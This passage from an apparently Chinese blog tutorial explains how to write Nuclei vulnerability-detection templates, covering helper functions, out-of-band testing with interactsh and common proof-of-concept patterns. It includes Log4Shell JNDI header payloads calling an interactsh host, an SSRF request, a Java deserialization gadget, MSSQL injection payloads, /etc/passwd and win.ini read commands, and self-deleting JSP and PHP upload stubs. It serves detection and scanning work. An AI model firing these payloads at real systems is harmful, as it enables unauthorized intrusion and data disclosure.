+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Wap-Profile</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;X-Api-Version</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">&#39;Host</span><span class="p">:</span><span class="w"> </span><span class="l">${jndi:ldap://{{interactsh-url}}/info}&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">attack</span><span class="p">:</span><span class="w"> </span><span class="l">clusterbomb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">interactsh_protocol</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">http</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="s2">&#34;http&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">interactsh_protocol</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">dns</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="s2">&#34;dns&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="可能会用到的辅助函数">可能会用到的辅助函数</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Helper function</td>
+<td>Description</td>
+<td>Example</td>
+<td>Output</td>
+</tr>
+<tr>
+<td>base64(src interface{}) string</td>
+<td>Base64 对字符串进行编码</td>
+<td><code>base64(&quot;Hello&quot;)</code></td>
+<td><code>SGVsbG8=</code></td>
+</tr>
+<tr>
+<td>base64_decode(src interface{}) []byte</td>
+<td>Base64 对字符串进行解码</td>
+<td><code>base64_decode(&quot;SGVsbG8=&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>base64_py(src interface{}) string</td>
+<td>像 python 一样将字符串编码为 base64（带有新行）</td>
+<td><code>base64_py(&quot;Hello&quot;)</code></td>
+<td><code>SGVsbG8=</code></td>
+</tr>
+<tr>
+<td>concat(arguments …interface{}) string</td>
+<td>连接给定数量的参数以形成一个字符串</td>
+<td><code>concat(&quot;Hello&quot;, 123, &quot;world)</code></td>
+<td><code>Hello123world</code></td>
+</tr>
+<tr>
+<td>compare_versions(versionToCheck string, constraints …string) bool</td>
+<td>将第一个版本参数与提供的约束进行比较</td>
+<td><code>compare_versions('v1.0.0', '&gt;v0.0.1', '&lt;v1.0.1')</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>contains(input, substring interface{}) bool</td>
+<td>验证字符串是否包含子字符串</td>
+<td><code>contains(&quot;Hello&quot;, &quot;lo&quot;)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>generate_java_gadget(gadget, cmd, encoding interface{}) string</td>
+<td>生成 Java 反序列化小工具</td>
+<td><code>generate_java_gadget(&quot;dns&quot;, &quot;{{interactsh-url}}&quot;, &quot;base64&quot;)</code></td>
+<td><code>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54</code></td>
+</tr>
+<tr>
+<td>gzip(input string) string</td>
+<td>使用 GZip 压缩输入</td>
+<td><code>gzip(&quot;Hello&quot;)</code></td>
+<td></td>
+</tr>
+<tr>
+<td>gzip_decode(input string) string</td>
+<td>使用 GZip 解压缩输入</td>
+<td><code>gzip_decode(hex_decode(&quot;1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000&quot;))</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>zlib(input string) string</td>
+<td>使用 Zlib 压缩输入</td>
+<td><code>base64(zlib(&quot;Hello&quot;))</code></td>
+<td><code>eJzySM3JyQcEAAD//wWMAfU=</code></td>
+</tr>
+<tr>
+<td>zlib_decode(input string) string</td>
+<td>使用 Zlib 解压缩输入</td>
+<td><code>zlib_decode(hex_decode(&quot;789cf248cdc9c907040000ffff058c01f5&quot;))</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>hex_decode(input interface{}) []byte</td>
+<td>十六进制解码给定的输入</td>
+<td><code>hex_decode(&quot;6161&quot;)</code></td>
+<td><code>aa</code></td>
+</tr>
+<tr>
+<td>hex_encode(input interface{}) string</td>
+<td>十六进制编码给定的输入</td>
+<td><code>hex_encode(&quot;aa&quot;)</code></td>
+<td><code>6161</code></td>
+</tr>
+<tr>
+<td>html_escape(input interface{}) string</td>
+<td>HTML 转义给定的输入</td>
+<td><code>html_escape(&quot;&lt;body&gt;test&lt;/body&gt;&quot;)</code></td>
+<td><code>&lt;body&gt;test&lt;/body&gt;</code></td>
+</tr>
+<tr>
+<td>html_unescape(input interface{}) string</td>
+<td>HTML 取消转义给定的输入</td>
+<td><code>html_unescape(&quot;&lt;body&gt;test&lt;/body&gt;&quot;)</code></td>
+<td><code>&lt;body&gt;test&lt;/body&gt;</code></td>
+</tr>
+<tr>
+<td>len(arg interface{}) int</td>
+<td>返回输入的长度</td>
+<td><code>len(&quot;Hello&quot;)</code></td>
+<td><code>5</code></td>
+</tr>
+<tr>
+<td>md5(input interface{}) string</td>
+<td>计算输入的 MD5（消息摘要）哈希</td>
+<td><code>md5(&quot;Hello&quot;)</code></td>
+<td><code>8b1a9953c4611296a827abf8c47804d7</code></td>
+</tr>
+<tr>
+<td>mmh3(input interface{}) string</td>
+<td>计算输入的 MMH3 (MurmurHash3) 哈希</td>
+<td><code>mmh3(&quot;Hello&quot;)</code></td>
+<td><code>316307400</code></td>
+</tr>
+<tr>
+<td>print_debug(args …interface{})</td>
+<td>打印给定输入或表达式的值。用于调试。</td>
+<td><code>print_debug(1+2, &quot;Hello&quot;)</code></td>
+<td><code>3 Hello</code></td>
+</tr>
+<tr>
+<td>rand_base(length uint, optionalCharSet string) string</td>
+<td>从可选字符集生成给定长度字符串的随机序列（默认为字母和数字）</td>
+<td><code>rand_base(5, &quot;abc&quot;)</code></td>
+<td><code>caccb</code></td>
+</tr>
+<tr>
+<td>rand_char(optionalCharSet string) string</td>
+<td>从可选字符集中生成随机字符（默认为字母和数字）</td>
+<td><code>rand_char(&quot;abc&quot;)</code></td>
+<td><code>a</code></td>
+</tr>
+<tr>
+<td>rand_int(optionalMin, optionalMax uint) int</td>
+<td>在给定的可选限制之间生成一个随机整数（默认为 0 - MaxInt32）</td>
+<td><code>rand_int(1, 10)</code></td>
+<td><code>6</code></td>
+</tr>
+<tr>
+<td>rand_text_alpha(length uint, optionalBadChars string) string</td>
+<td>生成给定长度的随机字母字符串，不包括可选的割集字符</td>
+<td><code>rand_text_alpha(10, &quot;abc&quot;)</code></td>
+<td><code>WKozhjJWlJ</code></td>
+</tr>
+<tr>
+<td>rand_text_alphanumeric(length uint, optionalBadChars string) string</td>
+<td>生成一个给定长度的随机字母数字字符串，没有可选的割集字符</td>
+<td><code>rand_text_alphanumeric(10, &quot;ab12&quot;)</code></td>
+<td><code>NthI0IiY8r</code></td>
+</tr>
+<tr>
+<td>rand_text_numeric(length uint, optionalBadNumbers string) string</td>
+<td>生成给定长度的随机数字字符串，没有可选的不需要的数字集</td>
+<td><code>rand_text_numeric(10, 123)</code></td>
+<td><code>0654087985</code></td>
+</tr>
+<tr>
+<td>regex(pattern, input string) bool</td>
+<td>针对输入字符串测试给定的正则表达式</td>
+<td><code>regex(&quot;H([a-z]+)o&quot;, &quot;Hello&quot;)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>remove_bad_chars(input, cutset interface{}) string</td>
+<td>从输入中删除所需的字符</td>
+<td><code>remove_bad_chars(&quot;abcd&quot;, &quot;bc&quot;)</code></td>
+<td><code>ad</code></td>
+</tr>
+<tr>
+<td>repeat(str string, count uint) string</td>
+<td>重复输入字符串给定的次数</td>
+<td><code>repeat(&quot;../&quot;, 5)</code></td>
+<td><code>../../../../../</code></td>
+</tr>
+<tr>
+<td>replace(str, old, new string) string</td>
+<td>替换给定输入中的给定子字符串</td>
+<td><code>replace(&quot;Hello&quot;, &quot;He&quot;, &quot;Ha&quot;)</code></td>
+<td><code>Hallo</code></td>
+</tr>
+<tr>
+<td>replace_regex(source, regex, replacement string) string</td>
+<td>替换与输入中给定正则表达式匹配的子字符串</td>
+<td><code>replace_regex(&quot;He123llo&quot;, &quot;(\\d+)&quot;, &quot;&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>reverse(input string) string</td>
+<td>反转给定的输入</td>
+<td><code>reverse(&quot;abc&quot;)</code></td>
+<td><code>cba</code></td>
+</tr>
+<tr>
+<td>sha1(input interface{}) string</td>
+<td>计算输入的 SHA1（安全哈希 1）哈希</td>
+<td><code>sha1(&quot;Hello&quot;)</code></td>
+<td><code>f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0</code></td>
+</tr>
+<tr>
+<td>sha256(input interface{}) string</td>
+<td>计算输入的 SHA256（安全哈希 256）哈希</td>
+<td><code>sha256(&quot;Hello&quot;)</code></td>
+<td><code>185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969</code></td>
+</tr>
+<tr>
+<td>to_lower(input string) string</td>
+<td>将输入转换为小写字符</td>
+<td><code>to_lower(&quot;HELLO&quot;)</code></td>
+<td><code>hello</code></td>
+</tr>
+<tr>
+<td>to_upper(input string) string</td>
+<td>将输入转换为大写字符</td>
+<td><code>to_upper(&quot;hello&quot;)</code></td>
+<td><code>HELLO</code></td>
+</tr>
+<tr>
+<td>trim(input, cutset string) string</td>
+<td>返回一个输入切片，其中包含在 cutset 中的所有前导和尾随 Unicode 代码点都已删除</td>
+<td><code>trim(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>trim_left(input, cutset string) string</td>
+<td>返回一个输入切片，其中包含在 cutset 中的所有前导 Unicode 代码点都已删除</td>
+<td><code>trim_left(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>Helloddd</code></td>
+</tr>
+<tr>
+<td>trim_prefix(input, prefix string) string</td>
+<td>返回没有提供的前导前缀字符串的输入</td>
+<td><code>trim_prefix(&quot;aaHelloaa&quot;, &quot;aa&quot;)</code></td>
+<td><code>Helloaa</code></td>
+</tr>
+<tr>
+<td>trim_right(input, cutset string) string</td>
+<td>返回一个字符串，其中包含在 cutset 中的所有尾随 Unicode 代码点都已删除</td>
+<td><code>trim_right(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>aaaHello</code></td>
+</tr>
+<tr>
+<td>trim_space(input string) string</td>
+<td>返回一个字符串，删除所有前导和尾随空格，由 Unicode 定义</td>
+<td><code>trim_space(&quot; Hello &quot;)</code></td>
+<td><code>&quot;Hello&quot;</code></td>
+</tr>
+<tr>
+<td>trim_suffix(input, suffix string) string</td>
+<td>返回没有提供的尾随后缀字符串的输入</td>
+<td><code>trim_suffix(&quot;aaHelloaa&quot;, &quot;aa&quot;)</code></td>
+<td><code>aaHello</code></td>
+</tr>
+<tr>
+<td>unix_time(optionalSeconds uint) float64</td>
+<td>返回当前 Unix 时间（自 1970 年 1 月 1 日 UTC 以来经过的秒数）以及添加的可选秒数</td>
+<td><code>unix_time(10)</code></td>
+<td><code>1639568278</code></td>
+</tr>
+<tr>
+<td>url_decode(input string) string</td>
+<td>URL 解码输入字符串</td>
+<td><code>url_decode(&quot;https:%2F%2Fprojectdiscovery.io%3Ftest=1&quot;)</code></td>
+<td><code>https://projectdiscovery.io?test=1</code></td>
+</tr>
+<tr>
+<td>url_encode(input string) string</td>
+<td>URL 对输入字符串进行编码</td>
+<td><code>url_encode(&quot;https://projectdiscovery.io/test?a=1&quot;)</code></td>
+<td><code>https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1</code></td>
+</tr>
+<tr>
+<td>wait_for(seconds uint)</td>
+<td>暂停执行给定的秒数</td>
+<td><code>wait_for(10)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>join(separator string, elements …interface{}) string)</td>
+<td>暂停执行给定的秒数</td>
+<td><code>join(&quot;_&quot;, 123, &quot;hello&quot;, &quot;world&quot;)</code></td>
+<td><code>123_hello_world</code></td>
+</tr>
+<tr>
+<td>hmac(algorithm, data, secret)</td>
+<td>hmac 函数，接受带有数据和秘密的散列函数类型</td>
+<td><code>hmac(&quot;sha1&quot;, &quot;test&quot;, &quot;scrt&quot;)</code></td>
+<td><code>8856b111056d946d5c6c92a21b43c233596623c6</code></td>
+</tr>
+<tr>
+<td>date_time(dateTimeFormat)</td>
+<td>以 go 风格的日期时间格式返回日期或时间</td>
+<td><code>date_time(&quot;%Y-%M-%D %H:%m&quot;)</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="oob测试">OOB测试</h1>
+<p>Nuclei 支持使用<a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreffer ">interact.sh</a> API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联。就像<code>{{interactsh-url}}</code> 在请求中的任何地方编写一样简单，并为<code>interact_protocol</code>. Nuclei 将处理交互与模板的相关性以及它通过允许轻松的 OOB 扫描而生成的请求。</p>
+<h2 id="interactsh-占位符">Interactsh 占位符</h2>
+<p><code>{{interactsh-url}}</code><strong>http</strong>和<strong>网络</strong>请求中支持占位符。</p>
+<p><code>{{interactsh-url}}</code>下面提供了一个带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl">- <span class="nt">raw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">      GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="sd">      Host: {{Hostname}}</span><span class="w">      
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="interactsh-匹配器">Interactsh 匹配器</h2>
+<p>Interactsh 交互可以与<code>word</code>，<code>regex</code>或<code>dsl</code>使用以下部分的匹配器/提取器一起使用。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">part</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">interactsh_protocol</td>
+</tr>
+<tr>
+<td style="text-align:center">interactsh_request</td>
+</tr>
+<tr>
+<td style="text-align:center">interactsh_response</td>
+</tr>
+</tbody>
+</table>
+<h3 id="interactsh_protocol">interactsh_protocol</h3>
+<p>值可以是 dns、http 或 smtp。这是每个基于interactsh的模板的标准匹配器，dns通常是通用值，因为它本质上是非侵入性的。</p>
+<h3 id="interactsh_request">interactsh_request</h3>
+<p>interact.sh 服务器收到的请求。</p>
+<h3 id="interactsh_response">interactsh_response</h3>
+<p>interact.sh 服务器发送给客户端的响应。</p>
+<p>Interactsh DNS 交互匹配器示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">interactsh_protocol</span><span class="w"> </span><span class="c"># Confirms the DNS Interaction</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;dns&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>交互内容上的 HTTP 交互匹配器 + 单词匹配器示例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">interactsh_protocol</span><span class="w"> </span><span class="c"># Confirms the HTTP Interaction</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;http&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">regex</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">interactsh_request</span><span class="w"> </span><span class="c"># Confirms the retrieval of etc/passwd file</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">regex</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;root:[x*]:0:0:&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="其他">其他</h1>
+<h2 id="stop-at-first-match">stop-at-first-match</h2>
+<p>一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描</p>
+<h2 id="skip-variables-check">skip-variables-check</h2>
+<p>当你的请求内容里包含 <code>{{</code> 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.</p>
+<h2 id="嵌套表达式">嵌套表达式</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❌ {{urldecode({{base64_decode(&#39;SGVsbG8=&#39;)}})}}
+</span></span><span class="line"><span class="cl">✔ {{url_decode(base64_decode(&#39;SGVsbG8=&#39;))}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h1 id="常见写法">常见写法</h1>
+<p>写POC应秉承无毒无害的本质，下面总结一些常用写法，其实也可以参考<a href="https://www.yuque.com/jarciscy/zkonow/kxc58s?" target="_blank" rel="noopener noreffer ">Xray POC编写模板</a>，只是写法有所不同。</p>
+<h2 id="文件读取">文件读取</h2>
+<p>文件读取应考虑windows和linux两种情况</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd文件：
+</span></span><span class="line"><span class="cl">matchers:
+</span></span><span class="line"><span class="cl">  - type: dsl
+</span></span><span class="line"><span class="cl">    dsl:
+</span></span><span class="line"><span class="cl">      - regex(&#39;root:.*?:[0-9]*:[0-9]*:&#39;,body) &amp;&amp; status_code == 200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">win.ini文件：
+</span></span><span class="line"><span class="cl">matchers:
+</span></span><span class="line"><span class="cl">      - type: dsl
+</span></span><span class="line"><span class="cl">        dsl:
+</span></span><span class="line"><span class="cl">          - status_code == 200 &amp;&amp; contains(body,&#34;for 16-bit app support&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/apache/php.ini文件：
+</span></span><span class="line"><span class="cl">matchers:
+</span></span><span class="line"><span class="cl">  - type: dsl
+</span></span><span class="line"><span class="cl">    dsl:
+</span></span><span class="line"><span class="cl">      - status_code == 200 &amp;&amp; contains_all(body,&#34;[PHP]&#34;,&#34;php.ini&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sql注入">SQL注入</h2>
+<h3 id="报错注入">报错注入</h3>
+<p>可以通过计算md5进行匹配</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">mssql</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;%20and</span><span class="si">%201%</span><span class="s1">3D(select</span><span class="si">%20s</span><span class="s1">ubstring(sys.fn_sqlvarbasetostr(HashBytes(&#39;</span><span class="n">MD5</span><span class="s1">&#39;%2C&#39;</span><span class="mi">999999999</span><span class="s1">&#39;))%2C3%2C32))%20--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">matchers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="n">type</span><span class="p">:</span> <span class="n">dsl</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dsl</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="o">-</span> <span class="n">contains</span><span class="p">(</span><span class="n">body</span><span class="p">,</span><span class="s2">&#34;c8c605999f3d8352d7bb792cf3fdb25b&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="延时注入">延时注入</h3>
+<p>延时注入之前设置sleep为5会有很多漏报，设为4后正常</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="err">：</span><span class="s1">&#39;);+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="s1">&#39;--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">matchers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="n">type</span><span class="p">:</span> <span class="n">dsl</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dsl</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="o">-</span> <span class="n">duration</span><span class="o">&gt;=</span><span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="命令执行">命令执行</h2>
+<p>命令执行可以通过OOB验证，可以通过读文件验证，也可以通过加减运算进行验证</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">读文件验证：
+</span></span><span class="line"><span class="cl">windows：type c:/windows/win.ini
+</span></span><span class="line"><span class="cl">linux：cat /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">加减运算：
+</span></span><span class="line"><span class="cl">windows：set /A {{randstr_1}}-{{randstr_2}}
+</span></span><span class="line"><span class="cl">linux：expr {{randstr_1}} - {{randstr_2}}  或  echo {{randstr_1}}-{{randstr_2}}|bc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="文件上传">文件上传</h2>
+<ul>
+<li>multipart/form-data; boundary=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;16314487820932200903769468567中的boundary应随机化</li>
+<li>在上传的文件不能删除的情况下，可以选择继续上传一个同名空文件（请确保上传后的文件名称不被重命名），将原来的文件内容进行覆盖。</li>
+<li>但常规情况下，在上传php，jsp文件时，可以使用一些函数来将上传的文件删除，示例如下：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JSP:
+</span></span><span class="line"><span class="cl">&lt;% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PHP:
+</span></span><span class="line"><span class="cl">&lt;?php echo &#34;{{randstr}}&#34;; unlink(__FILE__); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.cnblogs.com/haidragon/p/16852363.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/haidragon/p/16852363.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/9n13N28-c_zmaqae2-iAUw" target="_blank" rel="noopener noreffer ">https://mp.weixin.qq.com/s/9n13N28-c_zmaqae2-iAUw</a></p>
+<p><a href="https://blog.csdn.net/qq_41315957/article/details/126594670" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/qq_41315957/article/details/126594670</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-05-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
